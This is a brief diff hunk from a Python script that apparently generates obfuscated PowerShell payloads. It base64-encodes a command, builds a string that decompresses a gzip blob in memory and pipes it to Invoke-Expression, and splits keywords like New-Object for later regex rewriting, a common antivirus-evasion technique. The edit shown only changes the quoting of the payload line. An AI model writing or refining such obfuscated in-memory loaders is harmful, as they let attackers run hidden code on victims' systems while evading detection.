@@ -32,7 +32,7 @@ print(compressed_base64)
 
 encoded_command = base64.b64encode(command.encode('utf-16le')).decode('ascii')
 
-full_payload = r"$command = '" + encoded_command + r"""';(& (\New-Object\) (\IO.Compression.GZipStream\)([System.IO.MemoryStream][Convert]::FromBase64String('" + compressed_base64 + r"'), [System.IO.Compression.CompressionMode]::Decompress) | % {(& (\New-Object\) (\System.IO.StreamReader\)($_, [System.Text.Encoding]::ASCII))}).(\ReadToEnd\)() | Invoke-Expression"""
+full_payload = r"$command = '" + encoded_command + r"';(& (\New-Object\) (\IO.Compression.GZipStream\)([System.IO.MemoryStream][Convert]::FromBase64String('" + compressed_base64 + r"'), [System.IO.Compression.CompressionMode]::Decompress) | % {(& (\New-Object\) (\System.IO.StreamReader\)($_, [System.Text.Encoding]::ASCII))}).(\ReadToEnd\)() | Invoke-Expression"
 
 pattern = r"\\.+?\\"
 
